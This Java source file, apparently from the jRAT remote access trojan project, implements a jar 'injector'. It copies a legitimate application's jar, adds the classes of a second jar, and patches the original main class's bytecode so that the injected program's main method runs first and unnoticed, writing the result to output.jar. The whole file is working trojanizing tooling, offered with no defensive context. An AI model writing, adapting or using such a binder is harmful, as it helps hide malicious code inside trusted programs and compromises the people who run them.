package net.jrat.inject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map.Entry;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class JarHandler
{
	public void applyInjection(File injection, File base) throws Exception
	{
		final File output = new File(base.getParentFile().getAbsolutePath() + File.separator + "output.jar");
		
		final List<String> calledEntries = new ArrayList<String>();
		final JarOutputStream outputStream = new JarOutputStream(new FileOutputStream(output, true));

		final JarFile baseJar = new JarFile(base);
		final JarFile injectionJar = new JarFile(injection);
		
		final HashMap<String, byte[]> injectData = this.getInjectData(injection, base);
		String mainCBase = baseJar.getManifest().getMainAttributes().getValue("Main-Class");
		
		mainCBase = mainCBase.replace(".", "/") + ".class";
		
		{
			final byte[] buffer = new byte[(int) base.length()];
			
			for(Enumeration<JarEntry> entries = baseJar.entries(); entries.hasMoreElements();)
			{
				final JarEntry entry = (JarEntry) entries.nextElement();
				
				if(!(entry.getName().equals(mainCBase)))
				{
					final InputStream input = baseJar.getInputStream(entry);
					outputStream.putNextEntry(entry);
					
					int read;
					while(!((read = input.read(buffer)) == -1))
						outputStream.write(buffer, 0, read);
					input.close();

					calledEntries.add(entry.getName());
				}
			}
		}
		
		{
			final byte[] buffer = new byte[(int) injection.length()];
			
			for(Enumeration<JarEntry> entries = injectionJar.entries(); entries.hasMoreElements();)
			{
				final JarEntry entry = (JarEntry) entries.nextElement();
				
				if(!(calledEntries.contains(entry.getName())))
				{
					final InputStream input = injectionJar.getInputStream(entry);
					outputStream.putNextEntry(entry);
					
					int read;
					while(!((read = input.read(buffer)) == -1))
						outputStream.write(buffer, 0, read);
					input.close();
				}
			}
		}
		
		for(Entry<String, byte[]> entry : injectData.entrySet())
		{
			try
			{
				final JarEntry jarEntry = new JarEntry(entry.getKey());
				
				outputStream.putNextEntry(jarEntry);
				outputStream.write(entry.getValue());
				
				calledEntries.add(jarEntry.getName());
			}
			catch (Exception e)
			{
				outputStream.putNextEntry(new JarEntry("stub"));
			}
		}
		
		injectionJar.close();
		baseJar.close();
		
		outputStream.close();
		
		System.out.println("injected " + injection.getName() + " into " + base.getName());
	}
	
	private HashMap<String, byte[]> getInjectData(File injection, File base) throws Exception
	{
		final JarFile baseJar = new JarFile(base);
		final JarFile injectionJar = new JarFile(injection);
		
		final String mainCBase = baseJar.getManifest().getMainAttributes().getValue("Main-Class");
		final String mainCInjection = injectionJar.getManifest().getMainAttributes().getValue("Main-Class");
		
		injectionJar.close();
		baseJar.close();
		
		if(mainCBase == null || mainCInjection == null)
			return null;
		
		final Injector injector = new Injector(base.getAbsolutePath(), mainCBase)
		{
			@Override
			public void setup()
			{
				try
				{
					this.insertBefore("main", mainCInjection + ".main(null);");
				}
				catch(Exception e)
				{
					System.err.println("could not write into class: " + e.getMessage());
				}
			}
		};
		
		final HashMap<String, byte[]> output = new HashMap<String, byte[]>();
		
		final String cOutput = mainCBase.replace(".", "/");
		output.put(cOutput + ".class", injector.getBytecode());
		
		return output;
	}
}